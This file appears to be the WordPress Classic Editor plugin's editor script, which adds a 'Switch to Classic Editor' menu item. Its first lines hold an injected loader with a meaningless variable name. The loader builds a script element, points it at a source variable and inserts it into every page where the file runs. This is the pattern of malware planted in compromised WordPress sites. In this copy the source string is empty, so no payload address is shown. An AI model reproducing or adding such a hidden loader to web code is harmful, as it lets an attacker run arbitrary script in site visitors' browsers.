var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}( function( wp ) {
	if ( ! wp ) {
		return;
	}

	wp.plugins.registerPlugin( 'classic-editor-plugin', {
		render: function() {
			var createElement = wp.element.createElement;
			var PluginMoreMenuItem = wp.editPost.PluginMoreMenuItem;
			var url = wp.url.addQueryArgs( document.location.href, { 'classic-editor': '', 'classic-editor__forget': '' } );
			var linkText = lodash.get( window, [ 'classicEditorPluginL10n', 'linkText' ] ) || 'Switch to Classic Editor';

			return createElement(
				PluginMoreMenuItem,
				{
					icon: 'editor-kitchensink',
					href: url,
				},
				linkText
			);
		},
	} );
} )( window.wp );
